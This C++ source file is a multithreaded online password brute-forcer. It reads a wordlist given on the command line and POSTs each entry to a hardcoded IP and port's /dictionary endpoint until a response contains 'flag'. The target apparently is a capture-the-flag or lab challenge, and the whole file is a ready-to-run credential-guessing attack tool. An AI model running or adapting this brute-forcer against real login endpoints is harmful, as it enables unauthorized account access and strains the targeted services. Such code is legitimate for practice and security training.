#include <algorithm>
#include <atomic>
#include <curl/curl.h>
#include <curl/easy.h>
#include <fstream>
#include <iostream>
#include <mutex>
#include <stdlib.h>
#include <string>
#include <thread>
#include <vector>

const std::string ip = "94.237.54.145";
const int port = 37642;

std::mutex file_mutex;
std::mutex cout_mutex;
std::atomic<bool> cracked = false;

size_t write_callback(void* contents, size_t size, size_t nmemb, std::string* output) {
	size_t total = size * nmemb;
	output->append((char*) contents, total);
	return total;
}

void worker(std::ifstream& file) {
	std::string password;
	CURL* curl = curl_easy_init();
	if (!curl) {
		std::cerr << "Failed to initialize curl\n";
		return;
	}
	std::string url = "http://" + ip + ":" + std::to_string(port) + "/dictionary";
	curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
	curl_easy_setopt(curl, CURLOPT_POST, 1L);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);

	while (!cracked.load()) {
		{
			std::lock_guard<std::mutex> lock(file_mutex);
			if (!std::getline(file, password)) {
				break; // EOF
			}
		}

		password.erase(std::remove(password.begin(), password.end(), '\n'), password.end());
		password.erase(std::remove(password.begin(), password.end(), '\r'), password.end());

		std::string post_fields = "password=" + password;
		std::string response;

		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());

		CURLcode res = curl_easy_perform(curl);

		if (res == CURLE_OK) {
			if (response.find("flag") != std::string::npos) {
				cracked.store(true);
				std::lock_guard<std::mutex> lock(cout_mutex);
				std::cout << "\n--------------------\n"
						  << "Correct password found: " << password << "\n"
						  << "--------------------\n\n";
				std::cout << "Flag: " << response << "\n";
				break;
			} else {
				std::lock_guard<std::mutex> lock(cout_mutex);
				std::cout << "Attempted password: " << password << "\n";
			}
		} else {
			std::lock_guard<std::mutex> lock(cout_mutex);
			std::cerr << "Request failed for password: " << password << "\n";
		}

		response.clear(); // clear for next round
	}

    curl_easy_cleanup(curl);
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Bad usage\n";
    }

	const std::string wordlist_path = argv[1];
	std::ifstream file(wordlist_path);
	if (!file.is_open()) {
		fprintf(stderr, "Failed to openn");
		return 1;
	}

	const int num_threads = 8;
	std::vector<std::thread> threads;

	curl_global_init(CURL_GLOBAL_ALL);

	for (int i = 0; i < num_threads; i++) {
		threads.emplace_back(worker, std::ref(file));
	}

	for (auto& t : threads) {
		t.join();
	}
	curl_global_cleanup();
	return 0;
}
